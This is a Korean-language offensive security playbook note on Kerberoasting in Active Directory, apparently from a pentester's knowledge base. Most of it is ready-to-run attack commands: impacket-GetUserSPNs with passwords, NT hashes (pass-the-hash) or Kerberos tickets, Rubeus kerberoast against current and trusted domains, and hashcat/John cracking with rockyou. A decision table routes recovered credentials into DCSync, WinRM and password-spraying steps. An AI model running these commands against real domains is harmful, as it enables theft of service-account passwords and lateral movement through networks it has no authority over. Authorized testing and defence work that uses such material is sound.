---
tags:
  - 환경/ad
  - 서비스/kerberos
시작조건: ["명령 실행 위치에서 DC Kerberos 88 접근 가능", "요청자 도메인 계정의 비밀번호·NT hash 또는 Kerberos ticket 확보"]
필요권한: ["일반 도메인 사용자 수준의 TGS 요청 권한"]
필요조건: ["유효 도메인 계정 또는 ticket", "현재 또는 신뢰 대상 도메인에 SPN이 설정된 서비스 계정"]
결과: ["대상 SPN 계정의 Kerberos TGS hash", "크래킹 성공 시 대상 SPN 계정의 평문 비밀번호"]
---

# Kerberoasting

## 한 줄 판단

요청자 도메인 계정의 비밀번호·NT hash 또는 Kerberos Ticket-Granting Ticket(TGT)으로 현재 도메인이나 인증 가능한 신뢰 대상 도메인의 SPN 계정 TGS를 요청해 `$krb5tgs$` hash를 얻고 대상 SPN 계정의 비밀번호를 오프라인으로 크래킹한다.

## 사용할 때

- [[SPN 계정 열거]]에서 SPN이 설정된 사용자 기반 서비스 계정이 확인됐을 때.
- 유효한 도메인 credential 또는 Kerberos ticket을 확보했을 때.
- 서비스 계정 비밀번호 재사용, 고권한 서비스 계정, 오래된 RC4 암호화 사용 가능성을 확인할 때.

## 전제 조건

먼저 **명령을 실행할 위치에서 DC의 88번 포트에 접근할 수 있는지** 확인한다. `GetUserSPNs`로 SPN을 열거한다면 LDAP 389/636 도달성도 함께 필요하다.

```bash
nc -vz <DC_IP> 88
nc -vz <DC_IP> 389
```

```powershell
Test-NetConnection <DC_IP> -Port 88
Test-NetConnection <DC_IP> -Port 389
```

| 확인할 것 | 필요한 상태 | 충족하지 않을 때 |
|---|---|---|
| DC Kerberos 접근 | `nc`의 `succeeded`·`open` 또는 `TcpTestSucceeded: True` | DC에 접근 가능한 내부 호스트에서 실행하거나 [[내부망 경로 확보 후 피벗 구성]] |
| 명령 실행 위치 | Kali 또는 제어 중인 내부 호스트 중 DC:88에 닿는 위치 | 도메인 가입 호스트가 존재하기만 하고 명령 실행·피벗이 불가능하면 조건 미충족 |
| 요청자 계정 | 유효한 일반 도메인 계정의 비밀번호·NT hash 또는 TGT | 먼저 요청자 계정에 속한 도메인 인증 수단 확보 |
| 대상 계정 | 요청자와 별개의 사용자 계정에 SPN 존재 | [[SPN 계정 열거]]로 현재·신뢰 대상 도메인의 다른 대상 확인 |
| 신뢰 대상 도메인 | 현재 계정이 trust 방향에 따라 대상 도메인을 조회하고 Kerberos를 요청할 수 있음 | [[AD 도메인 트러스트 열거와 공격 경로 식별]]에서 방향·대상 LDAP·Kerberos 도달성 확인 |
| 크래킹 준비 | hash 형식에 맞는 Hashcat/John mode와 wordlist | hash etype 확인 후 mode 선택 |

### 요청자와 대상 계정 구분

| 역할 | 필요한 상태 | 비밀번호 복구 대상 |
|---|---|---|
| 요청자 | 유효한 일반 도메인 계정, credential 또는 TGT | 일반적으로 요청자의 비밀번호가 아님 |
| 대상 SPN 계정 | `servicePrincipalName`이 등록된 사용자 기반 서비스 계정 | SPN 소유 계정의 비밀번호 |

정리하면 공격 호스트의 도메인 가입 여부는 중요하지 않다. **DC:88에 닿는 위치에서 명령을 실행할 수 있고 요청자 도메인 계정의 비밀번호·NT hash 또는 TGT가 있으면** TGS를 요청할 수 있다. 컴퓨터 계정이나 gMSA도 SPN을 가질 수 있지만 비밀번호가 길고 자동 관리되므로 일반적으로 오프라인 크래킹 대상의 우선순위가 낮다.

## 실행

1. [[SPN 계정 열거]]로 사용자 기반 서비스 계정과 해당 SPN을 확인한다.
2. 필요한 계정만 대상으로 TGS hash를 요청한다.
3. Hashcat/John으로 오프라인 크래킹한다.
4. 복구한 비밀번호로 서비스/도메인 접근 범위를 확인한다.

SPN이 없는 사용자에 대해 `servicePrincipalName` 쓰기 권한이 확인된 경우에는 이 절차에서 속성을 직접 바꾸지 않고 [[임시 SPN 설정]]으로 기준값 기록·추가·복구를 수행한 뒤 [[표적 Kerberoasting]]에서 TGS hash를 요청한다.

### 현재 도메인의 SPN 계정 대상

#### Linux 공격 호스트에서 실행

##### Impacket으로 SPN과 TGS hash 수집

세 방식은 TGS를 요청하는 `<REQUESTER>`를 KDC에 인증하는 수단만 다르다. `<SPN_USER>`는 인증에 사용하는 계정이 아니라 `$krb5tgs$` hash와 비밀번호 복구의 대상이다.

| 보유한 요청자 인증 수단 | 사용할 방식 | 추가로 확인할 조건 |
|---|---|---|
| `<REQUESTER>`의 평문 비밀번호 | 비밀번호 인증 | 비밀번호가 현재 유효하고 요청자 계정이 잠기지 않음 |
| `<REQUESTER>`의 NT hash | NTLM Pass-the-Hash 기반 Kerberos 요청 | NT hash가 요청자 계정에 속하며 DC가 해당 인증 흐름을 허용 |
| `<REQUESTER>`의 유효한 TGT가 담긴 ccache | Kerberos ticket 인증 | `KRB5CCNAME`, ticket 만료, DC FQDN·realm·DNS·시간 정상 |

###### 1. 요청자 평문 비밀번호 사용

```bash
impacket-GetUserSPNs '<DOMAIN>/<REQUESTER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.hashes
```

특정 서비스 계정만 요청할 때는 전체 목록을 반복 수집하지 않는다.

```bash
impacket-GetUserSPNs '<DOMAIN>/<REQUESTER>:<PASSWORD>' -dc-ip <DC_IP> -request-user <SPN_USER> -outputfile kerberoast.hashes
```

###### 2. 요청자 NT hash 사용

```bash
impacket-GetUserSPNs '<DOMAIN>/<REQUESTER>' -hashes :<NT_HASH> -dc-ip <DC_IP> -request-user <SPN_USER> -outputfile kerberoast.hashes
```

- `<NT_HASH>`는 `<SPN_USER>`가 아니라 TGS를 요청할 `<REQUESTER>` 계정의 NT hash다.
- 이 명령은 `<SPN_USER>`의 NT hash를 얻지 않는다. 성공 시 얻는 값은 대상 SPN 계정의 오프라인 크래킹용 `$krb5tgs$` hash다.

###### 3. 요청자 Kerberos ccache 사용

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-GetUserSPNs -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<REQUESTER>' -request-user <SPN_USER> -outputfile kerberoast.hashes
```

- `-no-pass`는 익명 요청이 아니라 `KRB5CCNAME`에 있는 `<REQUESTER>`의 ticket으로 인증한다는 뜻이다.
- `klist`의 principal과 `<REQUESTER>`가 일치하고 유효한 TGT가 있는지 먼저 확인한다.

세 방식 모두 `$krb5tgs$`가 저장되어야 TGS 수집 성공이다. `KDC_ERR_PREAUTH_FAILED`·`STATUS_LOGON_FAILURE`는 요청자 비밀번호·NT hash·ticket과 계정 형식을 확인하고, `KDC_ERR_S_PRINCIPAL_UNKNOWN`은 대상 SPN·realm을 확인한다.

#### Windows 공격 호스트에서 실행

##### Rubeus로 Kerberoast

```cmd
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /nowrap /outfile:kerberoast.hashes
.\Rubeus.exe kerberoast /user:<SPN_USER> /nowrap /outfile:kerberoast.hashes
```

`/stats`로 계정 수와 지원 암호화 유형을 먼저 확인하고, 고가치 계정이나 약한 암호화 후보로 요청 범위를 줄인다.

### 신뢰 대상 도메인의 SPN 계정 대상

현재 계정이 속한 `<SOURCE_DOMAIN>`과 TGS를 요청할 `<TARGET_TRUST_DOMAIN>`을 구분하고, [[AD 도메인 트러스트 열거와 공격 경로 식별]]에서 대상 도메인 조회와 Kerberos 요청 방향을 먼저 확인한다.

#### Linux 공격 호스트에서 실행

##### Impacket으로 신뢰 대상 도메인 Kerberoast

Linux에서는 현재 계정의 도메인과 TGS를 요청할 신뢰 대상 도메인을 분리하여 지정한다.

```bash
impacket-GetUserSPNs -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<REQUESTER>:<PASSWORD>'
impacket-GetUserSPNs -request -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<REQUESTER>:<PASSWORD>' -outputfile trusted-domain-kerberoast.hashes
```

확인할 출력:

- 첫 실행에서 대상 도메인의 `ServicePrincipalName`, 계정 이름과 그룹 멤버십이 반환되어야 한다.
- `-request` 실행에서는 realm과 SPN 계정이 대상 도메인에 속한 `$krb5tgs$` hash가 저장되어야 한다.
- 복구한 비밀번호가 대상 포리스트의 다른 계정이나 현재 포리스트의 동명 계정에서도 재사용되는지는 별도 인증 검증으로 확인한다.

#### Windows 공격 호스트에서 실행

##### Rubeus로 신뢰 대상 도메인 Kerberoast

먼저 현재 계정으로 대상 도메인의 SPN 사용자와 그룹 멤버십을 조회한다.

```powershell
Get-DomainUser -SPN -Domain <TARGET_TRUST_DOMAIN> | Select-Object SamAccountName,MemberOf,ServicePrincipalName
```

대상 계정을 정한 뒤 `/domain`으로 TGS 요청 대상을 명시한다.

```cmd
Rubeus.exe kerberoast /domain:<TARGET_TRUST_DOMAIN> /user:<SPN_USER> /nowrap /outfile:trusted-domain-kerberoast.hashes
```

확인할 출력:

- `Target Domain`이 `<TARGET_TRUST_DOMAIN>`과 일치해야 한다.
- `SamAccountName`·`ServicePrincipalName` 뒤에 `$krb5tgs$` hash가 출력되어야 한다.
- 대상 도메인의 고권한 그룹 멤버십은 공격 우선순위 단서이며, 비밀번호 복구와 대상 도메인 인증 성공 전에는 권한 확보로 판정하지 않는다.

### 수집한 TGS hash 오프라인 크래킹

#### Linux 분석 호스트에서 Hashcat 또는 John 실행

```bash
hashcat -m 13100 kerberoast.hashes rockyou.txt --backend-ignore-opencl -d 1 -O -w 3
hashcat -m 19600 kerberoast-aes128.hashes rockyou.txt --backend-ignore-opencl -d 1 -O -w 3
hashcat -m 19700 kerberoast-aes256.hashes rockyou.txt --backend-ignore-opencl -d 1 -O -w 3
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hashes
```

Hashcat mode `13100`은 Kerberos 5 TGS-REP etype 23, mode `19600`은 etype 17, mode `19700`은 etype 18 hash에 사용한다. 실제 `$krb5tgs$` 접두부와 etype을 확인한 뒤 mode를 선택한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `$krb5tgs$` hash 저장 | SPN 계정의 TGS 요청 성공 | 오프라인 크래킹 가능한 Kerberos TGS hash 확보 | [[오프라인 해시 크래킹]] |
| Hashcat/John에서 평문 복구 | 서비스 계정 비밀번호 후보 확보 | 도메인 credential 후보 | 잠금 정책 확인 후 [[원격 비밀번호 공격]] |
| `MSSQLSvc/<MSSQL_FQDN>:<PORT_OR_INSTANCE>` 소유 계정의 평문 복구 | SPN에서 MSSQL 대상과 소유 AD 계정을 식별할 수 있음 | MSSQL Windows 인증 입력 | [[DB 인증과 데이터 열거]]에서 Windows는 `runas /netonly`·`sqlcmd -E` 또는 PowerUpSQL, Linux는 Impacket로 접속 검증 |
| SMB, LDAP, WinRM 또는 DB 인증 성공 | 비밀번호가 현재 유효함 | 서비스 계정 권한으로 접근 가능 | 그룹, 서비스 권한, 로컬/도메인 권한 분리 확인 |
| SPN 없음 | 현재 범위에서 서비스 계정 후보 미확인 | TGS hash 미획득 | LDAP 필터, 다른 OU와 MSSQL/HTTP SPN 확인 |
| SPN은 없으나 속성 쓰기 권한 확인 | 표적 SPN 등록 가능성 | 상태 변경이 필요한 Kerberoasting 후보 | [[임시 SPN 설정]]에서 기준값과 복구 절차를 확인한 뒤 [[표적 Kerberoasting]] |
| TGS 요청 실패 | 요청자 계정의 비밀번호·TGT, 대상 SPN, realm 또는 DC 연결 문제 | Kerberoasting 가능 여부 미판정 | 요청자 계정 인증·ticket 만료, realm, DC 88번·LDAP 389/636번과 FQDN 재확인 |
| crack 실패 | 강한 비밀번호 또는 AES hash | TGS hash만 확보 | rule, mask, 대상 기반 wordlist와 우선순위 재조정 |
| 복구 비밀번호 로그인 실패 | 비밀번호 변경 또는 서비스 제한 | 유효 credential 미확인 | 계정 상태와 사용 가능한 로그온 방식 확인 |

## 확인할 출력과 권한

- `$krb5tgs$`는 hash 수집 성공이며 평문 비밀번호나 서비스 접근 권한을 뜻하지 않는다.
- TGS 요청에는 유효한 도메인 계정 또는 TGT가 필요하지만 특별한 관리자 권한이나 공격 호스트의 도메인 가입은 필요하지 않다.
- 요청에 사용한 계정과 비밀번호를 크래킹할 대상 SPN 계정은 서로 다를 수 있으며, 복구 대상은 SPN 소유 계정이다.
- 복구한 서비스 계정의 로컬 관리자, 도메인 그룹, 서비스별 권한은 인증 후 별도로 확인한다.

## 후속 공격 연결


- hash cracking: [[오프라인 해시 크래킹]]
- 복구 비밀번호 검증: [[원격 비밀번호 공격]]
- `MSSQLSvc` SPN과 복구 비밀번호로 MSSQL Windows 인증: [[DB 인증과 데이터 열거]]
- 계정 권한에 따라: [[WinRM 원격 PowerShell 세션]], [[DCSync]]
- SPN 속성 쓰기 권한이 있을 때: [[임시 SPN 설정]], [[표적 Kerberoasting]]
- 다른 도메인 또는 포리스트 trust를 통해 요청할 때: [[AD 도메인 트러스트 열거와 공격 경로 식별]]
- TGS 요청 전 대상 계정을 다시 고를 때: [[SPN 계정 열거]]

## 비교 기법

- 사전 도메인 인증 없이 `DONT_REQ_PREAUTH` 사용자의 AS-REP를 요청할 때: [[AS-REP Roasting]]

## 관련 서비스

- [[88_Kerberos]]
- [[389_636_LDAP]]

## 관련 도구

- [[impacket-GetUserSPNs]]
- [[rubeus]]
- [[hashcat]]
- [[john]]
- [[klist]]
- [[netexec]]
- [[PowerView]]

## 관련 상태 라우터

- TGS hash만 확보한 상태: [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- 비밀번호 복구 또는 서비스 인증 성공: [[확보한 자격 증명으로 원격 접근 경로 선택]]
